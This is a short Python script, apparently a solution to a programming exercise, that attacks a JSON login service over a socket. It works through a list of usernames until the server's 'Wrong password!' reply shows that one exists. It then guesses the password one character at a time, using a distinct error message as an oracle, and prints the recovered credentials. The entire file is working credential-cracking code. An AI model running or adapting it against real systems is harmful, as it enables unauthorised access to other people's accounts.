import socket
import string
from sys import argv
import json


def parse_log():
    with open("logins.txt", "r") as file:
        for login in file:
            yield login.strip()


def password_comb():
    symbols = string.ascii_letters + string.digits
    while True:
        for symbol in symbols:
            yield symbol


def connect():
    passwd = ""
    args = argv
    with socket.socket() as client_socket:
        hostname = args[1]
        port = args[2]
        address = (hostname, int(port))
        client_socket.connect(address)
        login_gen = parse_log()
        passwd_gen = password_comb()
        while True:
            login = next(login_gen)
            message = json.dumps({"login": f"{login}", "password": " "})
            client_socket.send(message.encode())
            response = client_socket.recv(1024)
            if json.loads(response.decode()) == {"result": "Wrong password!"}:
                break
        while True:
            message = json.dumps({"login": f"{login}", "password": f"{passwd}" + f"{next(passwd_gen)}"})
            client_socket.send(message.encode())
            response = client_socket.recv(1024)
            if json.loads(response.decode()) == {"result": "Exception happened during login"}:
                passwd = "".join(json.loads(message)["password"])
            if json.loads(response.decode()) == {"result": "Connection success!"}:
                print(message)
                break


connect()